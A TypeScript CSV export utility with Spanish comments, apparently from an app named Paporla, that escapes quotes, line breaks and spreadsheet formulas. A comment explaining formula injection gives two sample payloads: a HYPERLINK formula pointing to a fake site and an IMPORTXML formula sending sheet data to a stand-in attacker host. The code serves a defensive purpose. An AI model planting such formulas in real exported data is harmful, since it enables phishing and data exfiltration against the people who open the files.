/**
 * Utilidad de exportación CSV para Paporla.
 * Convierte arrays de objetos a CSV y descarga el archivo.
 */

type CSVRow = Record<string, string | number | null | undefined>

/**
 * Convierte un array de objetos a string CSV.
 * La primera fila son los encabezados (keys del primer objeto).
 */
export function toCSV(rows: CSVRow[], columns?: { key: string; label: string }[]): string {
  if (rows.length === 0) return ''

  // Usar columnas definidas o inferir del primer objeto
  const cols = columns ?? Object.keys(rows[0]).map((k) => ({ key: k, label: k }))

  // Encabezados
  const header = cols.map((c) => escapeCSV(c.label)).join(',')

  // Filas
  const body = rows
    .map((row) =>
      cols
        .map((c) => {
          const value = row[c.key]
          return value != null ? escapeCSV(String(value)) : ''
        })
        .join(','),
    )
    .join('\n')

  return `${header}\n${body}`
}

// ============================================================================
// Inyección de fórmulas (CWE-1236)
// ============================================================================
// En un CSV, si una celda empieza por uno de estos caracteres, Excel, Google
// Sheets y LibreOffice NO la muestran como texto: la EJECUTAN como fórmula.
//
// Y en este CSV hay dos campos que escribe el usuario:
//   - Pack    → el título del pack, lo pone el comercio
//   - Cliente → el nombre visible, lo pone el cliente
//
// Conque alguien se llame:
//
//   =HYPERLINK("http://sitio-falso.cl","Ver mi reserva")
//   =IMPORTXML("http://atacante.cl?d="&A2,"//x")
//
// y el comercio exporte sus reservas y abra el archivo, la fórmula se ejecuta.
// Puede pescar al comercio o exfiltrar datos de la hoja.
//
// La defensa estándar es poner un apóstrofo delante: la celda pasa a ser texto
// y la fórmula se muestra, no se ejecuta. Es lo que hace OWASP y lo que hacen
// las librerías serias de CSV.
// ============================================================================
const INICIO_FORMULA = /^[=+\-@\t\r]/

/** Un número de verdad no es una fórmula: -1500 tiene que seguir siendo -1500. */
function esNumeroPlano(value: string): boolean {
  const limpio = value.trim()
  return limpio !== '' && Number.isFinite(Number(limpio))
}

/** Escapa un valor para CSV: comillas dobles, saltos de línea y fórmulas. */
function escapeCSV(value: string): string {
  const neutralizado = INICIO_FORMULA.test(value) && !esNumeroPlano(value) ? `'${value}` : value

  // El \r también cuenta: un retorno de carro suelto parte la línea en Excel
  // igual que el \n. Antes no se comprobaba.
  const necesitaComillas =
    neutralizado.includes(',') ||
    neutralizado.includes('"') ||
    neutralizado.includes('\n') ||
    neutralizado.includes('\r')

  if (necesitaComillas) {
    return `"${neutralizado.replace(/"/g, '""')}"`
  }
  return neutralizado
}

/**
 * Descarga un string como archivo CSV.
 * @param content Contenido del archivo
 * @param filename Nombre del archivo (sin extensión)
 */
export function downloadCSV(content: string, filename: string): void {
  const blob = new Blob([`\uFEFF${content}`], { type: 'text/csv;charset=utf-8' })
  const url = URL.createObjectURL(blob)
  const link = document.createElement('a')
  link.href = url
  link.download = `${filename}.csv`
  document.body.appendChild(link)
  link.click()
  document.body.removeChild(link)
  URL.revokeObjectURL(url)
}

/**
 * Exporta datos a CSV y lo descarga directamente.
 * @param rows Datos a exportar
 * @param filename Nombre del archivo
 * @param columns Columnas opcionales (key → label)
 */
export function exportToCSV(rows: CSVRow[], filename: string, columns?: { key: string; label: string }[]): void {
  const content = toCSV(rows, columns)
  downloadCSV(content, filename)
}
